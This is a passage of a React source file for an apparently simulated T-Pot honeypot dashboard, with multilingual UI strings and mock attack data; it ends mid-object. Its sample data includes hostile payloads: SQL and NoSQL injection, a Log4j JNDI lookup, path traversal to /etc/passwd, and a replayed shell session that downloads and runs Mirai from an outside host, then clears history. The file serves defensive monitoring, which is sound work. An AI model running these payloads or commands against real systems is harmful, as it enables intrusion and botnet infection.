import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { useTranslation } from 'react-i18next';
import { 
  ShieldAlert, 
  ShieldCheck, 
  Activity, 
  Layers, 
  Terminal as TerminalIcon, 
  Database, 
  Globe, 
  Server, 
  Cpu, 
  FileText, 
  Sliders, 
  Download, 
  Play, 
  Pause,
  Search, 
  Plus, 
  Trash2, 
  RefreshCw, 
  Key, 
  User, 
  Bell, 
  Lock, 
  Unlock, 
  Settings as SettingsIcon, 
  Binary, 
  Hash, 
  ChevronDown, 
  ChevronUp, 
  Check, 
  Copy, 
  Wifi, 
  WifiOff, 
  AlertTriangle,
  Flame,
  Volume2,
  VolumeX,
  ExternalLink,
  PlusCircle,
  HelpCircle,
  Crosshair
} from 'lucide-react';
import { 
  ResponsiveContainer, 
  PieChart, 
  Pie, 
  Cell, 
  BarChart, 
  Bar, 
  XAxis, 
  YAxis, 
  Tooltip, 
  Legend 
} from 'recharts';
import { ComposableMap, Geographies, Geography, Marker, Line as MapLine } from 'react-simple-maps';
import { cn } from '../lib/utils';
import TPotAttackMapTab from './honeypot/TPotAttackMapTab';

// World Atlas GeoJSON url
const geoUrl = "https://cdn.jsdelivr.net/npm/world-atlas@2/countries-110m.json";

// Types
type RBACRole = 'Admin' | 'Analyst' | 'Auditor';

interface HoneypotEvent {
  id: string;
  time: string;
  node: string;
  ip: string;
  country: string;
  countryCode: string;
  protocol: string;
  honeypot: string;
  payload: string;
  severity: 'Critical' | 'High' | 'Medium' | 'Low';
  actionTaken: 'Trapped' | 'Blocked' | 'Monitored';
}

interface DistributionItem {
  name: string;
  value: number;
}

interface NodeData {
  id: string;
  name: string;
  ip: string;
  type: 'HIVE' | 'SENSOR';
  cpu: number;
  ram: number;
  disk: number;
  uptime: string;
  status: 'Online' | 'Offline';
  containers: string[];
}

interface MalwareSample {
  id: string;
  filename: string;
  sha256: string;
  size: string;
  time: string;
  virusTotal: string;
  severity: 'Critical' | 'High' | 'Medium';
}

interface CredentialAttempt {
  id: string;
  username: string;
  password: string;
  count: number;
  node: string;
}

// Multi-language translation dictionaries
const LOCALES = {
  zh: {
    title: 'T-POT 控制中樞',
    subtitle: '欺敵安全維運',
    desc: 'COWRIE, DIONAEA & ELK 同步主控台 • v24.04-HEXA',
    search_placeholder: '搜尋來源 IP, 密碼字典, 節點資訊...',
    threat_level: '目前威脅等級',
    role_switch: '登入角色',
    admin: '管理員',
    analyst: '分析師',
    auditor: '稽核員',
    tab_dashboard: '📊 威脅情報儀表板',
    tab_attack_map: '🗺️ T-Pot 全球即時攻擊地圖',
    tab_nodes: '🖥️ 分散式節點管理',
    tab_logs: '🪵 深層攻擊日誌',
    tab_malware: '🔬 捕獲惡意樣本',
    tab_settings: '⚙️ 系統與帳號設定',
    tab_audit: '📑 系統操作日誌',
    elk_health: 'ELK 集群狀態',
    healthy: 'HEALTHY',
    es_capacity: 'ES 索引容量',
    logstash_load: 'Logstash 調度負載',
    active_nodes_msg: '當前蜜罐防區已覆蓋全球 12 個自律節點，已開啟自動化防禦。',
    metric_attacks: '今日誘捕攻擊次數',
    metric_ips: '不重複攻擊來源 IP',
    metric_malware: '活躍捕獲惡意軟體',
    metric_nodes: '分散式蜜罐節點',
    nodes_header_title: '分散式安全威脅探針節點 (T-Pot Distributed Clusters)',
    nodes_header_desc: '監測實時硬體指標。分析師及管理員均可一鍵下發重啟 Docker 或進入命令行。',
    add_node: '新增 T-Pot 蜜罐節點',
    reboot_services: '批次重啟蜜罐服務',
    table_name: '節點名稱',
    table_ip: '本地 IP',
    table_type: '節點類型',
    table_telemetry: '資源負載 (CPU / RAM / Disk)',
    table_uptime: '連線時間 Uptime',
    table_status: '運作狀態',
    table_action: '探針管理操控',
    btn_terminal: '特權終端',
    btn_restart: '重啟蜜罐',
    btn_wake: '遠端喚醒重連',
    logs_filters_title: 'Elasticsearch Index Query Filters (攻擊防範進階日誌過濾)',
    logs_component_label: '蜜罐協定組件',
    logs_country_label: '攻擊來源國家',
    logs_export_label: '防火牆黑名單格式導出',
    logs_reset_btn: '復位即時查詢條件',
    logs_header: 'Kibana Normalization Event Logs (點擊單行可展開查看 JSON 原始日誌)',
    logs_empty: '沒有任何與篩選條件相匹配的蜜罐捕獲日誌數據。',
    logs_detail_btn_block: '自動化聯防連動阻斷',
    logs_detail_blocked: '已在聯防黑名單中',
    logs_detail_copy: '複製 JSON',
    audit_header_title: '系統操作軌跡與合規性稽核日誌 (Auditor Compliance Sync)',
    audit_header_desc: '此日誌僅向管理員及稽核人員展示，專門用來監控『管理員』與『分析師』在系統上做過什麼敏感操作（如容器重設、API Key變更、政策調整）。',
    audit_export_pdf: '匯出 PDF 安全與合規報告',
    audit_table_time: '操作時間',
    audit_table_actor: '執行人員',
    audit_table_action: '操作行為描述',
    audit_table_target: '對接組件/接口',
    audit_table_result: '調配結果',
    audit_table_severity: '敏感評級',
    auditor_warning: '【稽核唯讀模式：已停止即時 Raw Data 跳動，僅顯示歷史統計】',
    malware_header_title: '惡意樣本分析沙箱 (Malware Detection Sandbox)',
    malware_header_desc: '被系統自動捕獲的攻擊 Payload 或惡意 binary 雜湊庫分析（VirusTotal 連動調用）。',
    settings_header_title: 'Edge Firewall Multi-linked Co-defense API Rules (邊緣防火牆自動化 API 聯防對接)',
    settings_label_auto: '啟用全自動邊緣防禦聯防',
    settings_desc_auto: '當蜜罐判斷核心威脅分值達 >= 80 時，自動調用邊緣 FW API 實施永久 IP 阻斷。',
    tab_pcap: '📡 Suricata 封包捕捉',
    tab_honeytoken: '🍯 誘餌防線管理',
    pcap_title: 'Suricata 全流量錄製與 PCAP 下載 (0-Day/N-Day Exploit Capture)',
    pcap_desc: '此功能列出被 Suricata 標記為高風險的攻擊事件。安全分析人員可快速點擊 [下載 PCAP 封包] 按鈕，直接下載封包或重現黑客是如何利用 0-Day 或新上市漏洞。',
    tbl_pcap_time: '事件時間',
    tbl_pcap_rule: '觸發規則 / 攻擊特徵 (Trigger Exploit Rule)',
    tbl_pcap_ip: '來源攻擊 IP',
    tbl_pcap_size: '封包大小',
    tbl_pcap_action: 'Wireshark 封包鑑識',
    btn_pcap_download: '下載 PCAP 封包',
    honeytoken_title: 'Honeytoken & Active Deception 偽裝與主動誘騙檔案配置',
    honeytoken_desc: '自訂虛擬的 Linux 檔案系統及麵包屑(Breadcrumbs)追蹤技術。當黑客將這些假檔案下載回自己電腦打開時，檔案內嵌的觸發機制會自動向 T-Pot 報警並回傳其真實 IP 與瀏覽器特徵。',
    honeytoken_add_btn: '新增偽裝誘餌檔案 (Honeytoken)',
    tbl_ht_name: '誘餌檔案名稱',
    tbl_ht_path: '部署虛擬路徑',
    tbl_ht_url: '信標觸發回報端點 (Webhook)',
    tbl_ht_downloads: '遭探測次數',
    tbl_ht_created: '建立時間',
    tbl_ht_actions: '配置操作',
    tbl_ht_remove: '移除誘餌',
    hp_feeds_card_title: 'Community Threat Intelligence Sharing (全球社群威脅情資共享與情資反饋)',
    hp_feeds_card_desc: '原生對接 HPFeeds 與 DShield 協定，匿名共享蜜罐數據至全球資安防護網，強化與威脅情資網絡的雙向協同。',
    toggle_hpfeeds: '啟用 HPFeeds 匿名分享（自動將攻擊日誌上傳至 SANS DShield 網路）',
    toggle_intel_sync: '自動下載全球黑客黑名單並同步至防火牆',
    tab_analysis: '🔬 蜜罐組件探勘',
    analysis_header_title: 'T-Pot Multi-Honeypot Specialist Analysis Panel (T-Pot 核心組件深度分析面板)',
    analysis_header_desc: '專門針對網頁誘捕 Tanner & Snare、惡意下載誘騙 Dionaea 以及遠端連線與登錄鑑識 Cowrie 進行底層惡意請求與指令拆解。'
  },
  en: {
    title: 'T-POT CONTROL HUB',
    subtitle: 'Deception Ops',
    desc: 'COWRIE, DIONAEA & ELK SYNC CONSOLE • v24.04-HEXA',
    search_placeholder: 'Search source IP, passwords, nodes...',
    threat_level: 'THREAT LEVEL',
    role_switch: 'ACTIVE ROLE',
    admin: 'Admin',
    analyst: 'Analyst',
    auditor: 'Auditor',
    tab_dashboard: '📊 Threat Dashboard',
    tab_attack_map: '🗺️ T-Pot Live Attack Map',
    tab_nodes: '🖥️ Node Management',
    tab_logs: '🪵 Deep Attack Logs',
    tab_malware: '🔬 Captures Sandbox',
    tab_settings: '⚙️ Settings & Rules',
    tab_audit: '📑 Operational Audit Logs',
    elk_health: 'ELK Cluster Health',
    healthy: 'HEALTHY',
    es_capacity: 'ES Storage Capacity',
    logstash_load: 'Logstash Ingestion EPS',
    active_nodes_msg: 'Zone is active over 12 autonomous nodes globally with security defenses enabled.',
    metric_attacks: 'Ingested Attacks Today',
    metric_ips: 'Unique Attacker IPs',
    metric_malware: 'Malware SHA256 Logged',
    metric_nodes: 'Distributed Nodes',
    nodes_header_title: 'Distributed Security Telemetry Sensors (T-Pot Distributed Clusters)',
    nodes_header_desc: 'Monitor hardware loads. Authorized personnel can trigger container restart or request interactive terminal sessions.',
    add_node: 'Add New T-Pot Node',
    reboot_services: 'Batch Reboot Services',
    table_name: 'Node Name',
    table_ip: 'Local IP',
    table_type: 'Registry Role',
    table_telemetry: 'Hardware Resources (CPU/RAM/Disk)',
    table_uptime: 'Service Uptime',
    table_status: 'Heartbeat State',
    table_action: 'Sensor Operations',
    btn_terminal: 'Terminal CLI',
    btn_restart: 'Reboot Container',
    btn_wake: 'Wake-on-LAN',
    logs_filters_title: 'Elasticsearch Index Filter Settings',
    logs_component_label: 'Honeypot Type',
    logs_country_label: 'Source Country',
    logs_export_label: 'Export Firewall Blacklist',
    logs_reset_btn: 'Reset Inquiry Parameters',
    logs_header: 'Kibana Unified Stream Logs (Click any line to view raw JSON events structure)',
    logs_empty: 'No threat event matches the queried filters.',
    logs_detail_btn_block: 'Block Inbound firewall API',
    logs_detail_blocked: 'Blocked on Edge Firewall',
    logs_detail_copy: 'Copy Raw JSON',
    audit_header_title: 'Compliance Track & Operational Audit Log Activity (Auditor Inquest)',
    audit_header_desc: 'Specifically loaded for Administrators and Compliance Officers to trace configuration revisions, container provisioning, and manual mitigations.',
    audit_export_pdf: 'Export Compliance PDF Report',
    audit_table_time: 'Timestamp',
    audit_table_actor: 'Actor Specialist',
    audit_table_action: 'Operation Activity',
    audit_table_target: 'Target Service/API',
    audit_table_result: 'Outcome',
    audit_table_severity: 'Audit Level',
    auditor_warning: '【Auditor Read-only: Live streams paused. Displaying frozen historical statistics】',
    malware_header_title: 'Malware Threat Analysis Sandbox (VirusTotal API)',
    malware_header_desc: 'Inspect parsed binary hashes and captured shell payloads retrieved dynamically by sensors.',
    settings_header_title: 'Edge Integration Rule Engines & Threat Remediation API Hooks',
    settings_label_auto: 'Enable Integrated Edge Mitigation',
    settings_desc_auto: 'Automatically execute edge state dropping rules via secure firewall APIs when score metrics exceed 80.',
    tab_pcap: '📡 PCAP Flow Captures',
    tab_honeytoken: '🍯 Honeytoken Deception',
    pcap_title: 'Suricata High-Risk PCAP Traffic Capture (0-Day Exploration)',
    pcap_desc: 'List of high-severity events identified by Suricata IDS. Analysts can download full network packets to perform packet forensics in Wireshark and trace modern exploit behaviors.',
    tbl_pcap_time: 'Timestamp',
    tbl_pcap_rule: 'Triggered Rule / Intrusive Signature',
    tbl_pcap_ip: 'Source Attacker IP',
    tbl_pcap_size: 'PCAP Size',
    tbl_pcap_action: 'Forensics Action',
    btn_pcap_download: 'Download PCAP File',
    honeytoken_title: 'Honeytoken Active Deception File Configurations',
    honeytoken_desc: 'Design falsified credentials, mock database configuration templates, and tracking beacons (breadcrumbs). Downloading and running these triggers alerts with the hostile physical IP.',
    honeytoken_add_btn: 'Deploy Active Honeytoken',
    tbl_ht_name: 'Decoy Name',
    tbl_ht_path: 'Mount Target Path',
    tbl_ht_url: 'Beacon Callback Webhook',
    tbl_ht_downloads: 'Detections Caught',
    tbl_ht_created: 'Deploy Timestamp',
    tbl_ht_actions: 'Actions',
    tbl_ht_remove: 'Erase Token',
    hp_feeds_card_title: 'Community Threat Intelligence Sharing Hooks (HPFeeds & SANS DShield)',
    hp_feeds_card_desc: 'Synchronize active local honeypot telemetry with global cyber threat intelligence networks anonymously.',
    toggle_hpfeeds: 'Enable HPFeeds telemetry sharing (Anonymously upload logs to SANS DShield global nodes)',
    toggle_intel_sync: 'Sync global community blacklists and dynamically sync rules to local firewall',
    tab_analysis: '🔬 Honeypot Analysis',
    analysis_header_title: 'T-Pot Specialized Honeypot Deep-Dive Analysis Panel',
    analysis_header_desc: 'Deep inspection panel for web-exploit trap Tanner, malware download logger Dionaea, and virtual terminal shell monitor Cowrie.'
  },
  ja: {
    title: 'T-POT 制御ハブ',
    subtitle: 'デセプション運用支援',
    desc: 'COWRIE, DIONAEA & ELK 同期コンソール • v24.04-HEXA',
    search_placeholder: '攻撃元IP、パスワード、ノードを照会...',
    threat_level: '現在の脅威レベル',
    role_switch: '権限ロール',
    admin: '管理者',
    analyst: 'アナリスト',
    auditor: '監査員',
    tab_dashboard: '📊 脅威ダッシュボード',
    tab_attack_map: '🗺️ T-Pot 攻撃マップ',
    tab_nodes: '🖥️ 統合ノード管理',
    tab_logs: '🪵 深層攻撃イベントログ',
    tab_malware: '🔬 検知マルウェア解析',
    tab_settings: '⚙️ 連携・システム設定',
    tab_audit: '📑 監査システム操作履歴',
    elk_health: 'ELK クラスタ状態',
    healthy: '健康稼働中',
    es_capacity: '索引ファイルサイズ',
    logstash_load: 'Logstash 配信 EPS',
    active_nodes_msg: 'デセプションエリアは現在、世界12個の自律ノードをカバー。自動防御有効。',
    metric_attacks: '本日検出された攻撃總数',
    metric_ips: '一ユニーク攻撃ソースIP数',
    metric_malware: 'マルウェア検体検知数',
    metric_nodes: '分散ハニーポットノード',
    nodes_header_title: '分散脅威検出センサーノード（T-Pot 分散クラスタ）',
    nodes_header_desc: 'リソース負荷状況を追跡。管理者はコンテナリブートやCLIシェル実行が可能です。',
    add_node: 'T-Pot ノード追加',
    reboot_services: 'サービス一括再起動',
    table_name: 'ノード名称',
    table_ip: 'アドレス IP',
    table_type: 'ノード区分',
    table_telemetry: 'ハードウェアリソース負（CPU/RAM/Disk）',
    table_uptime: '連続稼働時間',
    table_status: '通信状態',
    table_action: 'プローブ制御',
    btn_terminal: '特権端末 (CLI)',
    btn_restart: '再起動',
    btn_wake: 'リモート起動',
    logs_filters_title: 'Elasticsearch 解析条件設定',
    logs_component_label: 'ハニーポット種別',
    logs_country_label: '攻撃発信国',
    logs_export_label: 'ブロック対象リスト搬出',
    logs_reset_btn: 'クエリパラメータ復元',
    logs_header: 'Kibana イベント統合トレース（対象行をクリックで JSON ダンプを表示）',
    logs_empty: '指定されたフィルタに合致するインシデントはありません。',
    logs_detail_btn_block: '手動ブロック連動処理',
    logs_detail_blocked: 'ファイアウォール遮断完了',
    logs_detail_copy: 'JSONをコピー',
    audit_header_title: 'システム操作の監査インシデント履歴（準拠性検証監査トレース）',
    audit_header_desc: '本操作ログはシステム管理者および監査人専用です。権限更新、FWルール反映、手動対応履歴等が不変保持されます。',
    audit_export_pdf: 'PDF 監査報告書をエクスポート',
    audit_table_time: '記録時刻',
    audit_table_actor: '実行担当者',
    audit_table_action: '操作アクティビティ',
    audit_table_target: 'インターフェース / サービス',
    audit_table_result: '処理結果',
    audit_table_severity: '重要基準',
    auditor_warning: '【監査閲覧専用：リアルタイムトレースの一時停止。履歴統計情報のみ表示中】',
    malware_header_title: '検体分析サンドボックス (VirusTotal 統合API)',
    malware_header_desc: 'センサーネットワークにより捕獲された疑わしいバイナリ解析シグネチャの監査。',
    settings_header_title: 'エッジ自動遮断ポリシー設定 & 防御API連携制御',
    settings_label_auto: '自律防御シームレスブロックを有効化',
    settings_desc_auto: '攻撃スコアが数値 80 を充足するケースにおいて、全エッジファイアウォール対して破棄ポリシーを自動通知。',
    tab_pcap: '📡 捕獲パケット (PCAP)',
    tab_honeytoken: '🍯 デコイ誘餌ファイル設定',
    pcap_title: 'Suricata 統合ネットワークキャプチャ (PCAP Forensics)',
    pcap_desc: 'Suricata IDSによって標記された高リスク攻撃イベント一覧。パケットをダウンロードしてWiresharkで解析し、新型脆弱性 (0-Day) の探知手法を再現できます。',
    tbl_pcap_time: '記録時間',
    tbl_pcap_rule: '誘発シグネチャ / 攻撃規則',
    tbl_pcap_ip: '攻撃ソース IP',
    tbl_pcap_size: 'キャプチャサイズ',
    tbl_pcap_action: 'Wireshark 分析',
    btn_pcap_download: 'PCAP パケットをダウンロード',
    honeytoken_title: 'Honeytoken アクティブ・ディセプション運用',
    honeytoken_desc: '仮想のLinuxファイル・データベース設定、および埋め込み追跡（Breadcrumbs）技術を設計します。ハッカーが誤ってダウンロードして開いた際、送信元IPやデバイス特徴をバックエンドに即時ビーコン通知します。',
    honeytoken_add_btn: '新規 Honeytoken 誘餌を設置',
    tbl_ht_name: 'ファイル名称',
    tbl_ht_path: '仮想配置パス',
    tbl_ht_url: 'ビーコン Webhook URL',
    tbl_ht_downloads: '探知回数',
    tbl_ht_created: '設置日時',
    tbl_ht_actions: '操作',
    tbl_ht_remove: '廃棄',
    hp_feeds_card_title: 'グローバルサイバー情報協調共有 (HPFeeds 共有 & DShield 同期)',
    hp_feeds_card_desc: 'ローカルプローブにより捕獲された脅威インテリジェンスデータを、SANSのグローバル共同防御網と自動・匿名で双方向共有します。',
    toggle_hpfeeds: 'HPFeeds 匿名共有の有効化（SANS DShield レジストリへ匿名ログを連携）',
    toggle_intel_sync: 'グローバルハッカーブラックリストの定期取得とエッジファイアウォール連携',
    tab_analysis: '🔬 蜜罐深度分析',
    analysis_header_title: 'T-Pot 核心コンポーネント深層解析パネル',
    analysis_header_desc: 'ウェブ攻撃罠 Tanner、マルウェアダウンロード Dionaea、及び SSH/Telnet リモート接続接続 Cowrie の各詳細挙動を分解監査。'
  }
};

interface AuditLogItem {
  id: string;
  time: string;
  actor: string;
  action: string;
  target: string;
  result: string;
  severity: 'Critical' | 'High' | 'Medium' | 'Low';
}

export default function HoneypotManagerView() {
  const { i18n } = useTranslation();
  const currentLang = i18n.language || 'en';

  const VULN_COLORS = ['#EF4444', '#F59E0B', '#3B82F6', '#10B981', '#8B5CF6'];
  const tannerStatsData = [
    { name: 'RCE', value: 45 },
    { name: 'SQL Injection', value: 30 },
    { name: 'NoSQL Bypass', value: 15 },
    { name: 'Log4j Lookup', value: 6 },
    { name: 'Directory Traversal', value: 4 }
  ];

  const getLoc = (key: keyof typeof LOCALES['zh']) => {
    const lang = currentLang.startsWith('zh') ? 'zh' : currentLang.startsWith('ja') ? 'ja' : 'en';
    return LOCALES[lang][key] || LOCALES['en'][key] || key;
  };

  // Navigation & View Subtab Toggler
  const [activeTab, setActiveTab] = useState<'dashboard' | 'attack-map' | 'nodes' | 'logs' | 'malware' | 'settings' | 'audit' | 'pcap' | 'honeytoken' | 'analysis'>('dashboard');
  
  // Interactive RBAC Role configuration
  const [currentUserRole, setCurrentUserRole] = useState<RBACRole>('Admin');
  const [isRoleDropdownOpen, setIsRoleDropdownOpen] = useState(false);

  // PCAP Capture Events State
  interface PcapEvent {
    id: string;
    time: string;
    rule: string;
    ip: string;
    size: string;
  }
  const [pcapEvents, setPcapEvents] = useState<PcapEvent[]>([
    { id: 'PCAP-001', time: '11:06:45', rule: 'Log4j Enterprise Exploit Exploit (CVE-2021-44228)', ip: '43.239.58.41', size: '24.8 KB' },
    { id: 'PCAP-002', time: '11:05:41', rule: 'EternalBlue SMB Remote Exploit Probing (MS17-010)', ip: '103.44.122.5', size: '156.4 KB' },
    { id: 'PCAP-003', time: '10:48:12', rule: 'Apache Struts2 Command Injection Execution (CVE-2017-5638)', ip: '185.195.233.102', size: '42.1 KB' },
    { id: 'PCAP-004', time: '09:24:50', rule: 'Redis Unauthorized Direct Access execution', ip: '124.8.42.155', size: '8.5 KB' },
    { id: 'PCAP-005', time: '08:12:30', rule: 'Spring4Shell Payload delivery Remote Code Execution (CVE-2022-22965)', ip: '92.41.115.8', size: '78.2 KB' }
  ]);

  // Honeytoken Deception configuration details
  interface Honeytoken {
    id: string;
    name: string;
    path: string;
    url: string;
    downloads: number;
    created: string;
  }
  const [honeytokens, setHoneytokens] = useState<Honeytoken[]>([
    { id: 'HT-001', name: 'secrets_db_config.php', path: '/var/www/html/wp-includes/', url: 'https://beacon-tpot.corp/trigger/tok-001', downloads: 3, created: '2026-06-10 14:24' },
    { id: 'HT-002', name: 'employee_salaries_2026.csv', path: '/home/ubuntu/opt/shares/', url: 'https://beacon-tpot.corp/trigger/tok-002', downloads: 7, created: '2026-06-11 10:15' },
    { id: 'HT-003', name: 'admin_passwords.txt', path: '/etc/httpd/conf.d/', url: 'https://beacon-tpot.corp/trigger/tok-003', downloads: 0, created: '2026-06-12 01:05' }
  ]);
  const [showAddHoneytoken, setShowAddHoneytoken] = useState<boolean>(false);
  const [newTokenName, setNewTokenName] = useState<string>('');
  const [newTokenPath, setNewTokenPath] = useState<string>('');
  const [newWebhookUrl, setNewWebhookUrl] = useState<string>('');

  // HPFeeds telemetry and community threat sync
  const [hpfeedsSharingEnabled, setHpfeedsSharingEnabled] = useState<boolean>(true);
  const [threatFeedsAutoDownload, setThreatFeedsAutoDownload] = useState<boolean>(true);

  // Operational Auditor Audit logs
  const [auditLogs, setAuditLogs] = useState<AuditLogItem[]>([
    { id: 'AUD-001', time: '11:00:00', actor: 'Analyst C', action: 'Block IP 185.195.233.102', target: 'Fortinet API Server', result: 'Success', severity: 'High' },
    { id: 'AUD-002', time: '10:00:00', actor: 'Admin A', action: 'Restart docker container Cowrie', target: 'Docker API', result: 'Success', severity: 'Critical' },
    { id: 'AUD-003', time: '09:30:15', actor: 'Admin A', action: 'Update Splunk Webhook endpoint settings', target: 'SIEM Sync Core', result: 'Success', severity: 'Medium' },
    { id: 'AUD-004', time: '09:12:40', actor: 'Analyst B', action: 'Download malware capture payload mirai.x86_downloader', target: 'Database Sandbox', result: 'Success', severity: 'Low' },
    { id: 'AUD-005', time: '08:45:10', actor: 'Admin A', action: 'Register physical node: SENSOR-AFRICA', target: 'Kibana Cluster Sync', result: 'Success', severity: 'High' }
  ]);
  
  // General Threat Severity Level Toggle
  const [globalThreatLevel, setGlobalThreatLevel] = useState<'CRITICAL' | 'HIGH' | 'STABLE'>('HIGH');
  
  // Synthesizer Audio Warning Enabled
  const [synthSoundEnabled, setSynthSoundEnabled] = useState<boolean>(true);

  // Tanner Web Analysis specialized states
  interface TannerRequest {
    id: string;
    method: string;
    url: string;
    timestamp: string;
    vulnerability: string;
    scanner: string;
    clientIp: string;
    headers: Record<string, string>;
    payload: string;
  }
  const tannerRequests: TannerRequest[] = [
    {
      id: 'TAN-001',
      method: 'POST',
      url: '/wp-admin/admin-ajax.php',
      timestamp: '11:12:05',
      vulnerability: 'Remote Code Execution',
      scanner: 'Dirbuster Scanner Probing',
      clientIp: '185.195.233.102',
      headers: {
        'Host': 'wp-honey.dev-secure.net',
        'User-Agent': 'Mozilla/5.0 (compatible; Dirbuster/1.0-RC1; +http://www.owasp.org/)',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        'X-Forwarded-For': '185.195.233.102'
      },
      payload: 'action=install_plugin&plugin_slug=revslider&zip_url=http://malicious.com/badshell.zip'
    },
    {
      id: 'TAN-002',
      method: 'GET',
      url: '/index.php?id=1%20UNION%20SELECT%20NULL,%20username,%20password%20FROM%20users--%20',
      timestamp: '11:09:54',
      vulnerability: 'SQL Injection (Blind / Union)',
      scanner: 'SQLMap Injection Engine',
      clientIp: '43.239.58.41',
      headers: {
        'Host': 'portal-db.tpot-edge.net',
        'User-Agent': 'sqlmap/1.6.8#stable (https://sqlmap.org)',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': 'https://portal-db.tpot-edge.net/'
      },
      payload: 'N/A (GET Parameter Injection)'
    },
    {
      id: 'TAN-003',
      method: 'POST',
      url: '/api/v1/user/auth',
      timestamp: '10:45:11',
      vulnerability: 'NoSQL injection (MongoDB Bypass)',
      scanner: 'Custom exploit script',
      clientIp: '103.44.122.5',
      headers: {
        'Host': 'api-auth-mesh.internal',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) PostmanRuntime/7.32.3',
        'Content-Type': 'application/json'
      },
      payload: '{\n  "username": { "$gt": "" },\n  "password": { "$ne": "wrongPassword" }\n}'
    },
    {
      id: 'TAN-004',
      method: 'POST',
      url: '/gateway/logger',
      timestamp: '09:30:15',
      vulnerability: 'Log4j Exploit (JNDI Remote Lookup)',
      scanner: 'Nuclei Scanner Automated Probe',
      clientIp: '92.41.115.8',
      headers: {
        'Host': 'elk-gateway.enterprise.local',
        'User-Agent': 'Nuclei - Open-source project (github.com/projectdiscovery/nuclei)',
        'X-Api-Version': '${jndi:ldap://8.210.155.42:1389/Exploit}'
      },
      payload: 'event_log_version=4.12.0-GA&level=debug&event_hash=a64e12fb'
    },
    {
      id: 'TAN-005',
      method: 'GET',
      url: '/static/../../../../../../etc/passwd',
      timestamp: '08:15:22',
      vulnerability: 'Directory Traversal',
      scanner: 'Nikto Vulnerability Evaluator',
      clientIp: '124.8.42.155',
      headers: {
        'Host': 'frontend.customer-web.net',
        'User-Agent': 'Nikto/2.1.6 (Web scanner / custom triggers)',
        'Accept': 'text/html,application/xhtml+xml,application/xml'
      },
      payload: 'N/A (Directory Traversal file extraction)'
    }
  ];
  const [selectedTannerReq, setSelectedTannerReq] = useState<TannerRequest>(tannerRequests[0]);

  // Dionaea specialized states
  interface DionaeaCapture {
    id: string;
    timestamp: string;
    port: string;
    filename: string;
    sha256: string;
    ip: string;
    sandboxStatus: 'none' | 'analyzing' | 'complete';
    threatScore: number;
    description?: string;
  }
  const [dionaeaCaptures, setDionaeaCaptures] = useState<DionaeaCapture[]>([
    {
      id: 'DIO-001',
      timestamp: '11:04:12',
      port: '445 (SMB - EternalBlue)',
      filename: 'wannacry_ransomware_vector.bin',
      sha256: 'ed01ebfbc9eb5bbea545af901f228dc70bc1e3e85775a6126b412bc155e9d412',
      ip: '185.195.233.102',
      sandboxStatus: 'none',
      threatScore: 0
    },
    {
      id: 'DIO-002',
      timestamp: '10:22:45',
      port: '1433 (MSSQL SQL Injection payload)',
      filename: 'sql_backdoor_installer.ps1',
      sha256: '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08',
      ip: '43.239.58.41',
      sandboxStatus: 'none',
      threatScore: 0
    },
    {
      id: 'DIO-003',
      timestamp: '09:12:01',
      port: '3306 (MySQL UDF Privilege Escalation)',
      filename: 'lib_mysqludf_sys_escalate.so',
      sha256: '612bd893a7dbbc56dcbc010d210d1884caf2d08a127f8a1278ff2e9b0ae811b3',
      ip: '103.44.122.5',
      sandboxStatus: 'complete',
      threatScore: 94,
      description: 'LNX.Trojan.Mirai.Gen variant embedded dynamic library'
    }
  ]);

  // Cowrie terminal specialized states
  interface TerminalCommand {
    cmd: string;
    output: string;
  }
  const cowrieTerminalScript: TerminalCommand[] = [
    { cmd: 'whoami', output: 'root' },
    { cmd: 'id', output: 'uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:init_t:s0' },
    { cmd: 'cd /tmp || cd /var/run || cd /dev/shm', output: '' },
    { cmd: 'wget http://93.115.26.12/update_sys.sh -O update_sys.sh', output: 'Connecting to 93.115.26.12:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1284 (1.2 KB) [text/x-sh]\nSaving to: \'update_sys.sh\'\n\n     0K ..........                                           100% 41.2M=0s\n\n2026-06-12 11:34:10 (41.2 MB/s) - \'update_sys.sh\' saved [1284/1284]' },
    { cmd: 'chmod +x update_sys.sh', output: '' },
    { cmd: './update_sys.sh', output: '[+] Detecting processor architecture... Found AMD64 compatible\n[+] Downloading ELF binary: mirai.amd64 ...' },
    { cmd: 'wget http://93.115.26.12/bin/gogo.amd64 -O mirai && chmod 777 mirai', output: 'Saving to \'mirai\' [85.2 KB] download success' },
    { cmd: './mirai --botnet-connect=93.115.26.12:4832 --stealth-daemon', output: 'Starting socket thread...\nSpawned child process daemon [PID: 14022]\n[ALERT: Outbound Scanning Modules Instantiated!]' },
    { cmd: 'history -c', output: '' },
    { cmd: 'exit', output: 'logout\nConnection to 172.20.10.4 closed.' }
  ];
  const [terminalPlaying, setTerminalPlaying] = useState<boolean>(true);
  const [terminalLines, setTerminalLines] = useState<string[]>([]);
  const [currentCmdStep, setCurrentCmdStep] = useState<number>(0);
  const [playbackSpeed, setPlaybackSpeed] = useState<number>(1); // 1 = 1x, 2 = 2x, 5 = 5x
  const [analysisSubTab, setAnalysisSubTab] = useState<'tanner' | 'dionaea' | 'cowrie'>('tanner');
  
  // PCAP expansion details and state tracking
  const [expandedPcapId, setExpandedPcapId] = useState<string | null>(null);

  const PCAP_DETAILS: Record<string, {
    destPort: string;
    protocol: string;
    severity: 'Critical' | 'High' | 'Medium';
    payloadDecoded: string;
    hexdump: string;
    intelRisk: string;
    description: string;
  }> = {
    'PCAP-001': {
      destPort: '8080 (HTTP / Apache Tomcat)',
      protocol: 'TCP (Packet #12,845)',
      severity: 'Critical',
      payloadDecoded: '${jndi:ldap://8.210.155.42:1389/Exploit}',
